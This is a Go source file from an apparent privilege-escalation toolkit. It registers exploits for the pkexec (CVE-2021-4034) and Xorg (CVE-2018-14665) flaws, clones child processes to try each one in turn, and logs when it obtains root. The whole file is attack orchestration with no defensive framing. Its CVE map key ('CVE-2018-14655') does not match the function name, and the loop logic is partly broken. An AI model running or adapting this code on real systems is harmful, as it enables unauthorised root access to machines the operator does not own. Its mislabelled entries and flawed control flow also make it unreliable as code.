package golpe

import (
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
)

var All = map[string]func() error{
	"CVE-2021-4034":  CVE_2021_4034,  // pkexec
	"CVE-2018-14655": CVE_2018_14665, // xorg
}

func RunAll() (err error) {
	for cve, exp := range All {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGCHLD)

		go func() {
			for {
				<-sigCh // Wait for SIGCHLD signal
				// Reap zombie processes
				for {
					var status syscall.WaitStatus
					// Use WNOHANG to non-blockingly wait for any child process
					pid, _ := syscall.Wait4(-1, &status, syscall.WNOHANG, nil)
					if pid <= 0 {
						break // No more child processes
					}
				}
			}
		}()
		log.Printf("%d Trying %s...", os.Getpid(), cve)
		pid, _, _ := syscall.Syscall(syscall.SYS_CLONE, 0, 0, 0)
		if pid == 0 {
			err = exp()
			if err == nil {
				log.Printf("Successfully got root via %s", cve)
				break
			}
			log.Printf("%s: %v", cve, err)
		}
	}
	return
}
